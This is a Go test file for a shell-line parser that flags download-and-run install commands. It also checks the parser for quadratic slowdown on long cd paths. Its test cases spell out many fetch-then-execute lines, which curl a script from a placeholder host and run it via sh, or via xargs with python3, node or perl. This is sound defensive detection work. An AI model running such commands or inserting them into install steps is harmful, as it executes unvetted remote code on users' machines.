package installread

import (
	"slices"
	"strings"
	"testing"
	"time"
)

// Re-review of PIPE-SCRIPT-1 round 3 (fe8834fd): proofs. Each line downloads a script and runs it (a bash oracle ran
// every one); round 2 (d02597bf) gave the script target, the head is silent.
func TestReviewR3SilentRuns(t *testing.T) {
	const sh = "script:https://e.example.com/i.sh"
	B := "https://e.example.com/i"
	for _, l := range []string{
		// P2-1: a cd that does not persist, fails, comes back, or is an option
		"curl -O " + B + ".sh && (cd sub && make) && sh i.sh",
		"curl -O " + B + ".sh; (cd /tmp && make); sh i.sh",
		"curl -O " + B + ".sh; cd /nonexistent; sh i.sh",
		"curl -O " + B + ".sh; cd /tmp; cd -; sh i.sh",
		"curl -O " + B + ".sh; cd /tmp; cd \"$OLDPWD\"; sh i.sh",
		"curl -O " + B + ".sh; cd \"$PWD\"; sh i.sh",
		"curl -O " + B + ".sh; pushd /tmp; popd; sh i.sh",
		"curl -O " + B + ".sh; cd /tmp | true; sh i.sh",
		"curl -O " + B + ".sh && cd -P . && sh i.sh",
		"curl -O " + B + ".sh; cd; cd -; sh i.sh",
	} {
		if tg, _, _, _ := ParseLine(l); !slices.Contains(tg, sh) {
			t.Errorf("P2-1 ParseLine(%q) = %q; want %s", l, tg, sh)
		}
	}
	for _, l := range []string{ // P2-3: an interpreter's file under xargs
		"curl -fsSL -o i.py " + B + ".py && echo x | xargs python3 i.py",
		"curl -fsSL -o i.js " + B + ".js && echo | xargs node i.js",
		"curl -fsSL -o i.pl " + B + ".pl && echo | xargs perl i.pl",
	} {
		if tg, _, _, _ := ParseLine(l); len(tg) == 0 {
			t.Errorf("P2-3 ParseLine(%q): no target", l)
		}
	}
}

// P2-2: an absolute (or first relative) cd's folder is joined onto every later relative word: quadratic. 64 KiB
// against 256 KiB must grow about 4x, not 16x (head: 354 ms -> 4.6 s; develop 19 -> 72 ms).
func TestReviewR3LongFolderCost(t *testing.T) {
	for _, first := range []string{"cd /", "cd "} {
		var d [2]time.Duration
		for k, n := range []int{64 << 10, 256 << 10} {
			line := first + strings.Repeat("a", n/2) + strings.Repeat("; x", n/2/3)
			best := time.Hour
			for r := 0; r < 3; r++ {
				t0 := time.Now()
				ParseLine(line)
				best = min(best, time.Since(t0))
			}
			d[k] = best
		}
		if d[1] > 8*d[0]+50*time.Millisecond {
			t.Errorf("%q + a long folder: %v at 64 KiB, %v at 256 KiB (quadratic)", first, d[0], d[1])
		}
	}
}
